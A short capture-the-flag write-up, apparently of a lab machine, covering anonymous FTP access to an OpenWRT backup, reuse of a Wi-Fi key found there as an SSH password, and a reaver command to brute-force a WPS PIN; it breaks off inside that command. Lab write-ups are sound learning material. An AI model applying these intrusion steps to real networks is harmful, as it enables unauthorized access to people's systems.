### Web Enumeration

## Foothold

### `user1` ‚Üí `netadmin` üö©

#### Searching for Vulnerabilities

- ftp server allows anonymous login and contains an OpenWRT backup
- after extracting the tar archive, the file `etc/config/wireless` contains a password:
    
    ```
    config wifi-iface 'wifinet0'
    	option device 'radio0'
    	option mode 'ap'
    	option ssid 'OpenWrt'
    	option encryption 'psk'
    	option key 'VeRyUniUqWiFIPasswrd1!'
    	option wps_pushbutton '1'
    ```
    
- the file `etc/passwd` shows, that user `netadmin` has a home directory

#### Exploitation

1. We can login via ssh as `netadmin` with password `VeRyUniUqWiFIPasswrd1!` üö©


## Privilege Escalation

### `netadmin` ‚Üí `root` üèÅ

#### Searching for Vulnerabilities

- `iwconfig` output shows, that there is a interface `mon0` in monitor mode:
    
    ```
    eth0      no wireless extensions.
    
    wlan2     IEEE 802.11  ESSID:off/any

    hwsim0    no wireless extensions.
    
    lo        no wireless extensions.
    ```

- the `MigrateOpenWrt.txt` file from the ftp server indicates, that the tool `reaver` might be installed:

#### Exploitation

1. [reaver](https://www.notion.so/reaver-92a9bcd96c3d47b6a13a3df17641d19d?pvs=21) can be used to bruteforce the WPS PIN and recover the wifi password:
    
    ```
    $ reaver -i mon0 -b 02:00:00:00:00:00 -vv
